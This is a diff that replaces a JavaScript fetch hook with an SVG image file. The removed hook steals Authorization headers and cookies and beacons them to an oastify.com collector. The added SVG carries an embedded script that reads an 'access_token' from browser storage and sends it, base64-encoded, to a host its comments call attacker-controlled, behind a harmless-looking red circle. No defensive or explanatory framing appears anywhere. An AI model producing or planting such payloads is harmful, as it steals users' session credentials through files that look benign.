@@ -1,35 +1,14 @@
-(function() {
-    const originalFetch = window.fetch;
-    window.fetch = async (...args) => {
-        const [resource, config] = args;
-        let stolenData = {};
-
-        // 1. Capture the Authorization header from the fetch call
-        if (config && config.headers) {
-            // Support both object and Headers instance
-            const headers = config.headers instanceof Headers ? 
-                            Object.fromEntries(config.headers.entries()) : 
-                            config.headers;
-
-            if (headers['Authorization']) {
-                stolenData.authHeader = headers['Authorization'];
-            }
-        }
-
-        // 2. Capture all non-HttpOnly cookies
-        if (document.cookie) {
-            stolenData.cookies = document.cookie;
-        }
-
-        // 3. Exfiltrate if any data was found
-        if (Object.keys(stolenData).length > 0) {
-            // Using sendBeacon for a more "silent" delivery
-            navigator.sendBeacon(
-                'https://r806j2nndbetzeps5sqpgq63ouulid62.oastify.com/collect', 
-                JSON.stringify(stolenData)
-            );
-        }
-
-        return originalFetch(...args);
-    };
-})();
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <script type="text/javascript">
+    // 1. Capture the token from storage
+    const token = localStorage.getItem('access_token') || sessionStorage.getItem('access_token');
+    
+    // 2. Exfiltrate the data to an attacker-controlled server
+    if (token) {
+      fetch(`https://r806j2nndbetzeps5sqpgq63ouulid62.oastify.comm/log?data=${btoa(token)}`, {
+        mode: 'no-cors'
+      });
+    }
+  </script>
+  <circle cx="50" cy="50" r="40" fill="red" />
+</svg>
